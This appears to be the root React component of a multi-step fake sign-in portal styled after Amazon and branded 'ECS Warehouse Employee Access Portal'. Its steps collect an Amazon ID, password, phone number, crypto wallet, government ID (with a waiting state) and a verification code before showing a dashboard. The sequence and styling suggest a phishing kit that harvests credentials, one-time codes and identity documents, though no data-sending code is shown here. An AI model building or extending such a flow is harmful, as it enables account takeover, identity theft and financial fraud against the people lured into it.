import { AuthProvider, useAuth } from './store/authStore';
import VideoBackground from './components/VideoBackground';
import Step1AmazonID from './steps/Step1AmazonID';
import Step2Password from './steps/Step2Password';
import Step3Phone from './steps/Step3Phone';
import Step4Wallet from './steps/Step4Wallet';
import Step5GovID from './steps/Step5GovID';
import Step6VerifyCode from './steps/Step6VerifyCode';
import Dashboard from './components/Dashboard';
import type { AuthStep } from './store/authStore';

function AuthFlow() {
  const { step } = useAuth();

  const stepComponents: Record<AuthStep, React.ReactNode> = {
    'step1-id': <Step1AmazonID />,
    'step2-password': <Step2Password />,
    'step3-phone': <Step3Phone />,
    'step4-wallet': <Step4Wallet />,
    'step5-govid': <Step5GovID />,
    'step5-waiting': <Step5GovID />,
    'step6-code': <Step6VerifyCode />,
    'dashboard': <Dashboard />,
  };

  const isDashboard = step === 'dashboard';

  return (
    <>
      <VideoBackground />
      <div className="auth-container">
        {/* Logo Header - only show on auth steps, not dashboard */}
        {!isDashboard && (
          <div className="mb-4 text-center">
            <img
              src="/images/ecs-logo.png"
              alt="ECS Warehouse"
              style={{ height: 48, objectFit: 'contain' }}
            />
            <p className="text-[13px] text-[#565959] mt-1">Employee Access Portal</p>
          </div>
        )}

        {/* Form Card or Dashboard */}
        {isDashboard ? (
          <Dashboard />
        ) : (
          <div className="form-card">
            {/* Warehouse watermark */}
            <div
              className="absolute bottom-2 right-2 pointer-events-none select-none"
              style={{ opacity: 0.08 }}
            >
              <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#232F3E" strokeWidth="1.5">
                <path d="M3 21h18M5 21V7l8-4 8 4v14M9 21v-6h6v6" />
                <path d="M9 9h1v1H9zM14 9h1v1h-1z" />
              </svg>
            </div>
            {stepComponents[step]}
          </div>
        )}
      </div>
    </>
  );
}

export default function App() {
  return (
    <AuthProvider>
      <AuthFlow />
    </AuthProvider>
  );
}
